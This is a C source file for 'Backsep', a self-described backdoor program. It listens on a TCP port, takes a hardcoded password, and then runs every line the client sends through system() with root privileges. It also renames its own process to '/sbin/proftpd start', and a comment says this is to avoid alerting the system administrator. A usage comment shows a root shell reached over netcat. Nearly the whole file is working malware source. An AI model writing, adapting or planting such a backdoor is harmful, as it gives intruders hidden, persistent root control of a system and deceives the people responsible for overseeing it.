/* Backsep - program creates backdoor in a system.
Standard compilation: "gcc Backsep.c -o Backsep".
Usage:
root@melisa:/usr/home/seprob # ./Backsep &
[1] 777
root@melisa:/usr/home/seprob # nc localhost 5308
eleet
Hello! I'm Backsep. Seprob created me (http://seprob.blogspot.com/).
Command: id
uid=0(root) gid=0(wheel) groups=0(wheel),5(operator)
Command: logout
root@melisa:/usr/home/seprob #
*/

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>

#define HELLO "Hello! I'm Backsep. Seprob created me (http://seprob.blogspot.com/).\n"
#define PROMPT "Command: "
#define PASS "eleet"
#define MASK "/sbin/proftpd start"

void error_errno(const char *what); /* error_errno function gives content of error based on value attributed "errno" variable and finishes the program. */
void error_none(const char *what); /* error_none function informs about an error and finishes the program. */

main(int argc, char *argv[]) {
    int iterator; /* Variable using in for loop. */
    char *server_address = "127.0.0.1"; /* Address of server. */
    int port = 5308; /* Port on which server listens. */
    struct sockaddr_in server_structure; /* Structure to fill on server side. */
    struct sockaddr_in client_strucuture; /* Structure to fill on client side. */
    int socket_length; /* Length of socket. */
    int server_socket_descriptor; /* Socket's descriptor of server. */
    int client_socket_descriptor; /* Socket's descriptor of client. */
    char input_data[256]; /* Buffer for input data. */
    int bytes; /* Bytes. */
    int input_descriptor, output_descriptor, error_descriptor; /* Descriptor copies of input, output and errors. */

    strcpy(argv[0], MASK); /* Changing of backdoor name to name which doesn't awake of system administrator. */

    /* Increasing of rights to root user. */

    if (setuid(0) == -1)
        error_errno("setuid");

    if (setgid(0) == -1)
        error_errno("setgid");

    /* Creating of server socket. */

    if ((server_socket_descriptor = socket(PF_INET, SOCK_STREAM, 0)) == -1) 
        error_errno("socket");

    /* Creating of server socket address. */

    memset(&server_structure, 0, sizeof(server_structure)); /* Filling the structure with zeros. */

    server_structure.sin_family = PF_INET;

    server_structure.sin_port = htons(port); /* Converting from host byte order to network byte order. */

    server_structure.sin_addr.s_addr = inet_addr(server_address); /* Processing of recorded address to 32 bit internet address. */

    if (server_structure.sin_addr.s_addr == INADDR_NONE)
        error_none("bad address");

    socket_length = sizeof(server_structure);

    /* Binding of server address with socket. */

    if (bind(server_socket_descriptor, (struct sockaddr *)&server_structure, socket_length) == -1)
        error_errno("bind");

    /* Socket listening. */

    if (listen(server_socket_descriptor, 10) == -1)
        error_errno("listen");

    /* Duplicating of input descriptor. */

    if ((input_descriptor = dup(0)) == -1)
        error_errno("dup");

    /* Duplicating of output descriptor. */

    if ((output_descriptor = dup(1)) == -1)
        error_errno("dup");

    /* Duplicating of error descriptor. */

    if ((error_descriptor = dup(2)) == -1)
        error_errno("dup");

    /* Loop of server. */

    while (1) {
        /* Looking for connection. */

        socket_length = sizeof(client_strucuture);

        if ((client_socket_descriptor = accept(server_socket_descriptor, (struct sockaddr *)&client_strucuture, &socket_length)) == -1)
            error_errno("accept");

        /* Looking for password. */

        while (1) {
            memset(input_data, '\0', sizeof(input_data));

            bytes = sizeof(input_data);

            if (read(client_socket_descriptor, input_data, bytes) == -1)
                error_errno("read");

            for (iterator = 0; iterator <= strlen(input_data); iterator++) {
                if ((input_data[iterator] == '\r') || (input_data[iterator] == '\n'))
                    input_data[iterator] = '\0';
            }

            if (strcmp(input_data, PASS) == 0)
                break;
            else
                continue;
}

        /* Changing of input stream to client descriptor. */

        if (dup2(client_socket_descriptor, 0) == -1)
            error_errno("dup2");

        /* Changing of output stream to client descriptor. */

        if (dup2(client_socket_descriptor, 1) == -1)
            error_errno("dup2");

        /* Changing of errors stream to client descriptor. */

        if (dup2(client_socket_descriptor, 2) == -1)
            error_errno("dup2");

        bytes = sizeof(HELLO);

        if (write(client_socket_descriptor, HELLO, bytes) == -1)
            error_errno("write");

        /* Looking for commands. */

        while (1) {
            memset(&input_data, '\0', sizeof(input_data));

            bytes = sizeof(PROMPT);

            if (write(client_socket_descriptor, PROMPT, bytes) == -1)
                error_errno("write");

            bytes = sizeof(input_data);

            if (read(client_socket_descriptor, input_data, bytes) == -1)
                error_errno("read");

            for (iterator = 0; iterator <= strlen(input_data); iterator++) {
                if ((input_data[iterator] == '\r') || (input_data[iterator] == '\n'))
                    input_data[iterator] = '\0';
            }

            if ((strcmp(input_data, "exit") == 0) || (strcmp(input_data, "logout") == 0)) {
                if (close(client_socket_descriptor) == -1)
                    error_errno("close");

                break;
            }

            /* Executing of commands. */

            system(input_data);
        }

        if (dup2(input_descriptor, 0) == -1)
            error_errno("dup2");

        if (dup2(output_descriptor, 1) == -1)
            error_errno("dup2");

        if (dup2(error_descriptor, 2) == -1)
            error_errno("dup2");
}

    if (close(server_socket_descriptor) == -1)
        error_errno("close");

    return 0;
}

void error_none(const char *what) {
fprintf(stderr, "Eror: %s.\n", what);
     
exit(1);
}

void error_errno(const char *what) {
fprintf(stderr, "%s: %s function.\n", what, strerror(errno));
     
exit(1);
}
